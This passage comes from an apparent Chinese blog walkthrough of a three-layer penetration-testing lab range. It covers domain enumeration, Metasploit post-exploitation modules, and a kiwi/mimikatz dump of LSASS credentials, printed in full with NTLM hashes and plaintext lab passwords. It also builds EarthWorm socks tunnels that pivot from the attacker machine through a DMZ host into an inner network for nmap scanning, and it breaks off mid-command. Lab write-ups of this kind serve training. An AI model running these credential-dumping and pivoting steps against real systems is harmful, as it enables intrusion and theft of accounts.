获取指定域用户的信息"></a>7）net user 用户名 /domain   获取指定域用户的信息</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net user Administrator /domainnet user Administrator /domainThe request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取失败。</p><h4 id="8）net-group-domain"><a href="#8）net-group-domain" class="headerlink" title="8）net group /domain"></a>8）net group /domain</h4><p>查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net group /domainnet group /domainThe request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>报了相同的错误，报这些错误的命令应该只能在DC上执行。</p><h4 id="9）net-group-组名-domain-查看域中某工作组"><a href="#9）net-group-组名-domain-查看域中某工作组" class="headerlink" title="9）net group 组名 /domain    查看域中某工作组"></a>9）net group 组名 /domain    查看域中某工作组</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net group Administrators /domainnet group Administrators /domainThe request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10）net-group-“domain-admins”-domain-查看域管理员的名字"><a href="#10）net-group-“domain-admins”-domain-查看域管理员的名字" class="headerlink" title="10）net group “domain admins” /domain   查看域管理员的名字"></a>10）net group “domain admins” /domain   查看域管理员的名字</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net group <span class="token string">"domain admins"</span> /domain net group <span class="token string">"domain admins"</span> /domain The request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="11-net-group-“domain-computers”-domain-查看域中的其他主机名"><a href="#11-net-group-“domain-computers”-domain-查看域中的其他主机名" class="headerlink" title="11) net group “domain computers” /domain  查看域中的其他主机名"></a>11) net group “domain computers” /domain  查看域中的其他主机名</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net group <span class="token string">"domain computers"</span> /domain net group <span class="token string">"domain computers"</span> /domain The request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="12）net-group-“domain-controllers”-domain-查看域控制器（可能有多台）"><a href="#12）net-group-“domain-controllers”-domain-查看域控制器（可能有多台）" class="headerlink" title="12）net group “domain controllers” /domain  查看域控制器（可能有多台）"></a>12）net group “domain controllers” /domain  查看域控制器（可能有多台）</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net group <span class="token string">"domain controllers"</span> /domain  net group <span class="token string">"domain controllers"</span> /domain  The request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>收集到的信息非常少，但是去靶场主机上执行是可以收集到相应的域信息的，可能还是meterpreter的权限不够。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.40.24.png" style="zoom:70%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.42.47.png" style="zoom:80%;"><h3 id="8-5-4-基于msf的后渗透模块收集域信息"><a href="#8-5-4-基于msf的后渗透模块收集域信息" class="headerlink" title="8.5.4 基于msf的后渗透模块收集域信息"></a>8.5.4 基于msf的后渗透模块收集域信息</h3><h4 id="1）获取登陆用户的SID"><a href="#1）获取登陆用户的SID" class="headerlink" title="1）获取登陆用户的SID"></a>1）获取登陆用户的SID</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter<span class="token operator">&gt;</span> run post/windows/gather/enum_logged_on_users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> run post/windows/gather/enum_logged_on_users <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running against session <span class="token number">1102</span>Current Logged Users<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> SID                                             User ---                                             ---- S-1-5-18                                        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM S-1-5-21-1315137663-3706837544-1429009142-1112  WHOAMIANONY<span class="token punctuation">\</span>bunny S-1-5-21-1315137663-3706837544-1429009142-500   WHOAMIANONY<span class="token punctuation">\</span>Administrator<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results saved in: /root/.msf4/loot/20250117030327_default_192.168.52.30_host.users.activ_551562.txtRecently Logged Users<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> SID                                             Profile Path ---                                             ------------ S-1-5-18                                        %systemroot%<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>config<span class="token punctuation">\</span>systemprofile S-1-5-19                                        C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>ServiceProfiles<span class="token punctuation">\</span>LocalService S-1-5-20                                        C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>ServiceProfiles<span class="token punctuation">\</span>NetworkService S-1-5-21-1315137663-3706837544-1429009142-1112  C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>bunny S-1-5-21-1315137663-3706837544-1429009142-500   C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>administrator.WHOAMIANONY S-1-5-21-1982601180-2087634876-2293013296-1000  C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>liukaifeng01 S-1-5-21-2952760202-1353902439-2381784089-500   C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到用户有：NT AUTHORITY\SYSTEM、WHOAMIANONY\bunny、WHOAMIANONY\Administrator 三个用户。</p><p>第一个通过meterpreter登录的用户，WHOAMIANONY\Administrator 是域管理员。</p><h4 id="2）获取域控信息及域内主机信息"><a href="#2）获取域控信息及域内主机信息" class="headerlink" title="2）获取域控信息及域内主机信息"></a>2）获取域控信息及域内主机信息</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/enum_domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2016.08.39.png" style="zoom:50%;"><p>可以看到域控是192.168.93.30.</p><h4 id="3）域内所有机器"><a href="#3）域内所有机器" class="headerlink" title="3）域内所有机器"></a>3）域内所有机器</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/enum_ad_computers <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> run post/windows/gather/enum_ad_computers <span class="token punctuation">[</span>-<span class="token punctuation">]</span> extapi_adsi_domain_query: Operation failed: <span class="token number">2147943726</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>目前掌握的几个关键信息：</p><ul><li><p>域：whoamianony.org</p></li><li><p>域控：192.168.93.30 </p></li><li><p>域控主机名：DC.whoamianony.org</p></li><li><p>域管理员：Administrator</p></li></ul><h1 id="九、kiwi抓取域用户密码"><a href="#九、kiwi抓取域用户密码" class="headerlink" title="九、kiwi抓取域用户密码"></a>九、kiwi抓取域用户密码</h1><h2 id="7-1-加载kiwi"><a href="#7-1-加载kiwi" class="headerlink" title="7.1 加载kiwi"></a>7.1 加载kiwi</h2><p>Kiwi 是 Metasploit 框架中的一个模块，它是一个类似于mimikatz的工具，但比mimikatz更强大。Kiwi模块能够从Windows系统中提取多种凭据信息，包括哈希值、明文密码等。它能够从多种来源获取这些敏感信息，例如LSASS（本地安全权限服务）进程、注册表、以及域控制器的内存等。加载kiwi模块后，可以使用<code>kiwi_cmd</code>命令来提取凭据信息。此外，mimikatz模块已经合并为kiwi模块，可以使用<code>mimikatz_command</code>命令获取明文密码。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2016.29.15.png" style="zoom:50%;"><h2 id="7-2-抓取用户口令"><a href="#7-2-抓取用户口令" class="headerlink" title="7.2 抓取用户口令"></a>7.2 抓取用户口令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kiwi_cmd privilege::debugkiwi_cmd sekurlsa::logonPasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2016.33.52.png" style="zoom:50%;"><p>抓取到的用户凭证：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> kiwi_cmd sekurlsa::logonPasswordsAuthentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">1573149</span> <span class="token punctuation">(</span>00000000:0018011d<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> CachedInteractive from <span class="token number">1</span>User Name         <span class="token builtin class-name">:</span> AdministratorDomain            <span class="token builtin class-name">:</span> WHOAMIANONYLogon Server      <span class="token builtin class-name">:</span> DCLogon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:49:38SID               <span class="token builtin class-name">:</span> S-1-5-21-1315137663-3706837544-1429009142-500        msv <span class="token builtin class-name">:</span>         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         * Username <span class="token builtin class-name">:</span> Administrator         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * LM       <span class="token builtin class-name">:</span> 56b0cd8b125c05055e2dd9e955f18034         * NTLM     <span class="token builtin class-name">:</span> ab89b1295e69d353dd7614c7a3a80cec         * SHA1     <span class="token builtin class-name">:</span> 2bc4124300a6a8fc0ca10891823d36c64e4b3a40        tspkg <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> Administrator         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> Whoami2021        wdigest <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> Administrator         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> Whoami2021        kerberos <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> Administrator         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY.ORG         * Password <span class="token builtin class-name">:</span> Whoami2021        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">1338474</span> <span class="token punctuation">(</span>00000000:00146c6a<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> Interactive from <span class="token number">1</span>User Name         <span class="token builtin class-name">:</span> bunnyDomain            <span class="token builtin class-name">:</span> WHOAMIANONYLogon Server      <span class="token builtin class-name">:</span> DCLogon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:47:43SID               <span class="token builtin class-name">:</span> S-1-5-21-1315137663-3706837544-1429009142-1112        msv <span class="token builtin class-name">:</span>         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         * Username <span class="token builtin class-name">:</span> bunny         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * LM       <span class="token builtin class-name">:</span> 7de10bf327ef7f2ac6ebe8776a153feb         * NTLM     <span class="token builtin class-name">:</span> cc567d5556030b7356ee4915ff098c8f         * SHA1     <span class="token builtin class-name">:</span> 3747632756191e3350e53211c63f804eb163638f        tspkg <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> bunny         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> Bunny2021        wdigest <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> bunny         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> Bunny2021        kerberos <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> bunny         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY.ORG         * Password <span class="token builtin class-name">:</span> Bunny2021        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">997</span> <span class="token punctuation">(</span>00000000:000003e5<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> Service from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> LOCAL SERVICEDomain            <span class="token builtin class-name">:</span> NT AUTHORITYLogon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:43:54SID               <span class="token builtin class-name">:</span> S-1-5-19        msv <span class="token builtin class-name">:</span>        tspkg <span class="token builtin class-name">:</span>        wdigest <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         * Domain   <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         * Password <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         * Domain   <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         * Password <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">996</span> <span class="token punctuation">(</span>00000000:000003e4<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> Service from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> PC1$Domain            <span class="token builtin class-name">:</span> WHOAMIANONYLogon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:43:54SID               <span class="token builtin class-name">:</span> S-1-5-20        msv <span class="token builtin class-name">:</span>         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         * Username <span class="token builtin class-name">:</span> PC1$         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * NTLM     <span class="token builtin class-name">:</span> 3e6a3d8c713b4821eaa51aab25f52074         * SHA1     <span class="token builtin class-name">:</span> d8e1318a24c64b8fcc89dc8609b09af50342bacf        tspkg <span class="token builtin class-name">:</span>        wdigest <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> PC1$         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> %Yn<span class="token operator">!</span>@ZW,eWz<span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span><span class="token punctuation">[</span><span class="token operator">!</span>hh<span class="token punctuation">;</span>H.<span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token punctuation">(</span>yh^2YADmU*2bVx<span class="token operator">&lt;</span>N<span class="token comment">#yvw.9MTwmi;84''uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/"$V6?sDZel=f&gt;[ol;</span>        kerberos <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> pc1$         * Domain   <span class="token builtin class-name">:</span> whoamianony.org         * Password <span class="token builtin class-name">:</span> %Yn<span class="token operator">!</span>@ZW,eWz<span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span><span class="token punctuation">[</span><span class="token operator">!</span>hh<span class="token punctuation">;</span>H.<span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token punctuation">(</span>yh^2YADmU*2bVx<span class="token operator">&lt;</span>N<span class="token comment">#yvw.9MTwmi;84''uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/"$V6?sDZel=f&gt;[ol;</span>        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">50033</span> <span class="token punctuation">(</span>00000000:0000c371<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> UndefinedLogonType from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Domain            <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:43:54SID               <span class="token builtin class-name">:</span>         msv <span class="token builtin class-name">:</span>         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         * Username <span class="token builtin class-name">:</span> PC1$         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * NTLM     <span class="token builtin class-name">:</span> 3e6a3d8c713b4821eaa51aab25f52074         * SHA1     <span class="token builtin class-name">:</span> d8e1318a24c64b8fcc89dc8609b09af50342bacf        tspkg <span class="token builtin class-name">:</span>        wdigest <span class="token builtin class-name">:</span>        kerberos <span class="token builtin class-name">:</span>        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">999</span> <span class="token punctuation">(</span>00000000:000003e7<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> UndefinedLogonType from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> PC1$Domain            <span class="token builtin class-name">:</span> WHOAMIANONYLogon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:43:54SID               <span class="token builtin class-name">:</span> S-1-5-18        msv <span class="token builtin class-name">:</span>        tspkg <span class="token builtin class-name">:</span>        wdigest <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> PC1$         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> %Yn<span class="token operator">!</span>@ZW,eWz<span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span><span class="token punctuation">[</span><span class="token operator">!</span>hh<span class="token punctuation">;</span>H.<span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token punctuation">(</span>yh^2YADmU*2bVx<span class="token operator">&lt;</span>N<span class="token comment">#yvw.9MTwmi;84''uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/"$V6?sDZel=f&gt;[ol;</span>        kerberos <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> pc1$         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY.ORG         * Password <span class="token builtin class-name">:</span> %Yn<span class="token operator">!</span>@ZW,eWz<span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span><span class="token punctuation">[</span><span class="token operator">!</span>hh<span class="token punctuation">;</span>H.<span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token punctuation">(</span>yh^2YADmU*2bVx<span class="token operator">&lt;</span>N<span class="token comment">#yvw.9MTwmi;84''uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/"$V6?sDZel=f&gt;[ol;</span>        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键信息：</p><pre><code>     * Username : Administrator     * Domain   : WHOAMIANONY     * Password : Whoami2021</code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">* Username <span class="token builtin class-name">:</span> bunny* Domain   <span class="token builtin class-name">:</span> WHOAMIANONY* Password <span class="token builtin class-name">:</span> Bunny2021<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>成功抓取到域用户bunny和域管理员administrator的凭证：</p><ul><li><p>bunny：Bunny2021</p></li><li><p>administrator：Whoami2021</p></li></ul><h1 id="十、三层网络隧道搭建"><a href="#十、三层网络隧道搭建" class="headerlink" title="十、三层网络隧道搭建"></a>十、三层网络隧道搭建</h1><h2 id="10-1-添加meterpreter路由"><a href="#10-1-添加meterpreter路由" class="headerlink" title="10.1 添加meterpreter路由"></a>10.1 添加meterpreter路由</h2><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.29.16.png" style="zoom:50%;"><p>将msfconsole的流量通过session2路由到192.168.93.0网段。下面可以使用msf做三层网络的信息探测。</p><ul><li>三层网络主机发现</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/discovery/udp_probe<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.93.0/24<span class="token builtin class-name">set</span> threads <span class="token number">50</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.35.05.png" style="zoom:50%;"><p>发现的ip：192.168.93.20、192.168.93.30、192.168.93.40</p><h2 id="10-2-EW隧道搭建"><a href="#10-2-EW隧道搭建" class="headerlink" title="10.2 EW隧道搭建"></a>10.2 EW隧道搭建</h2><p>路由转发只能将msfconsole带进内网，而要想将攻击机上的其他攻击程序也带进内网还需要搭建socks代理。我们使用earthworm搭建一个二级socks5代理服务。</p><h3 id="10-2-1-攻击机"><a href="#10-2-1-攻击机" class="headerlink" title="10.2.1 攻击机"></a>10.2.1 攻击机</h3><p>首先攻击机上执行如下命令添加一个转接隧道，监听1090端口，并将1090端口收到的代理请求发送给1235端口，执行命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> lcx_listen <span class="token parameter variable">-l</span> <span class="token number">1090</span> <span class="token parameter variable">-e</span> <span class="token number">1235</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.51.07.png" style="zoom:40%;"><h3 id="10-2-2-二层网络的web服务器"><a href="#10-2-2-二层网络的web服务器" class="headerlink" title="10.2.2 二层网络的web服务器"></a>10.2.2 二层网络的web服务器</h3><p>然后在第二层网络的Windows服务器上传ew_for_Win.exe，并利用ssocksd方式启动999端口的正向socks代理，执行命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ew_for_Win.exe <span class="token parameter variable">-s</span> ssocksd <span class="token parameter variable">-l</span> <span class="token number">999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.55.36.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.56.28.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.58.12.png" style="zoom:50%;"><p>可以看到999端口已经开启了监听。</p><h3 id="10-2-3-DMZ区的web1主机"><a href="#10-2-3-DMZ区的web1主机" class="headerlink" title="10.2.3 DMZ区的web1主机"></a>10.2.3 DMZ区的web1主机</h3><p>最后，在DMZ区域的Ubuntu 18上传ew_for_linux64并利用lcx_slave方式，将攻击机的1235端口与第二层网络Windows 7的999端口连接起来，执行命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> lcx_slave <span class="token parameter variable">-d</span> <span class="token number">192.168</span>.1.7 <span class="token parameter variable">-e</span> <span class="token number">1235</span> <span class="token parameter variable">-f</span> <span class="token number">192.168</span>.52.30 <span class="token parameter variable">-g</span> <span class="token number">999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.59.36.png" style="zoom:50%;"><h3 id="10-2-4-配置proxychains"><a href="#10-2-4-配置proxychains" class="headerlink" title="10.2.4 配置proxychains"></a>10.2.4 配置proxychains</h3><p>设置proxychains等代理工具，通过访问攻击机的1090端口来使用架设在第二层网络Windows主机上的socks代理服务，来进入第三层网络。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.00.22.png" style="zoom:50%;"><h2 id="10-3-基于隧道用namp扫描核心网"><a href="#10-3-基于隧道用namp扫描核心网" class="headerlink" title="10.3 基于隧道用namp扫描核心网"></a>10.3 基于隧道用namp扫描核心网</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sT</span> <span class="token parameter variable">-O</span> <span class="token 